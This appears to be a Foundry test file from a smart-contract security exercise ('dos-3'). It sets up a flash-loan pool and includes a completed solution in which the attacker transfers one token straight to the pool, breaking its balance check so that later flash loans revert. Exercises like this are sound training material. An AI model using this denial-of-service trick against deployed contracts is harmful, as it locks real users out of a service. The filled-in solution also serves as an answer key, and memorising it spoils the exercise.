// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import "forge-std/console.sol";
import "src/dos-3/ShibaPool.sol";
import "src/dos-3/ShibaToken.sol";
import "src/dos-3/FlashLoanUser.sol";

/**
 * @dev run "forge test -vvv --match-contract DOS3"
 */
contract TestDOS3 is Test {
    uint256 constant INITIAL_SUPPLY = 1_000_000 ether;
    uint256 constant TOKENS_IN_POOL = 100_000 ether;
    uint256 constant ATTACKER_TOKENS = 10 ether;

    address deployer = makeAddr("deployer");
    address user = makeAddr("user");
    address attacker = makeAddr("attacker");

    ShibaToken token;
    ShibaPool pool;
    FlashLoanUser userContract;

    function setUp() public {
        /**
         * SETUP EXERCISE - DON'T CHANGE ANYTHING HERE
         */

        // Deploy contracts
        vm.startPrank(deployer);
        token = new ShibaToken(INITIAL_SUPPLY);
        pool = new ShibaPool(address(token));

        // Send tokens
        token.transfer(attacker, ATTACKER_TOKENS);
        token.approve(address(pool), TOKENS_IN_POOL);
        pool.depositTokens(TOKENS_IN_POOL);

        // Balances check
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(attacker), ATTACKER_TOKENS);

        // FlashLoan check
        vm.startPrank(user);
        userContract = new FlashLoanUser(address(pool));
        userContract.requestFlashLoan(10);
        vm.stopPrank();
    }

    function testDosAttack() public {
        /**
         * CODE YOUR SOLUTION HERE
         */
        vm.prank(attacker);
        token.transfer(address(pool), 1);

        /**
         * SUCCESS CONDITIONS
         */
        vm.startPrank(user);
        vm.expectRevert();
        userContract.requestFlashLoan(10);
    }
}
